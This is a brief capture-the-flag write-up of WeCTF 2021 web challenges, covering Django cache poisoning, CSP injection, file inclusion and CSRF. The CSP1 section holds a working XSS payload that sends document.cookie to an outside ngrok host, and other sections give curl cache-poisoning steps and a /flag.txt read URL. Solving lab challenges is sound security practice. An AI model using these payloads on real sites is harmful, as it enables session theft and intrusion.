# WeCTF 2021

[WeCTF 2021 Github REPO](https://github.com/wectf/2021)

## Cache

Two problem from the implementation. According to the documentation of [Django re_path](https://docs.djangoproject.com/en/3.2/ref/urls/#re-path), the parameter should be a regular expression. Matching with `"flag"` actually means that **path contains "flag" will trigger the handler**, e.g `/sdfafds/flag`, `/flag_custom.css`. Secondly, cache implementation is based on user_provided url **, but cookie content is not a cache key**. This opening a opportunity for cache poisoning attack.

```shell
# Admin view the page
curl -X GET --cookie "token=CroRQgDwMmJdybKa" "http://140.113.194.71:4002/flag_RetrOisHere.css"

# Attacker view the page
curl -X GET "http://140.113.194.71:4002/flag_RetrOisHere.css"
```

## CSP1

The app is vulnerability to csp policy injection. Except `connect-src`, other policies can be modified. Pair with xss, we can achieve cookie exfiltration.

```html
<!-- Payload -->
<img src="http://140.113.42.242; script-src 'unsafe-inline' 9a4c-140-113-229-111.ngrok.io">

<script>
  let sc = document.createElement("script")
  sc.src = "http://9a4c-140-113-229-111.ngrok.io/?coo=" + document.cookie

  document.body.appendChild(sc)
</script>
```

## Include

url: `/?🤯=/flag.txt`

## CSP 2/3

Php Object Injection at `/?method=post`, Report URI Modification, Data Exfiltration

## Coin Exchange

WebSocket + CSRF


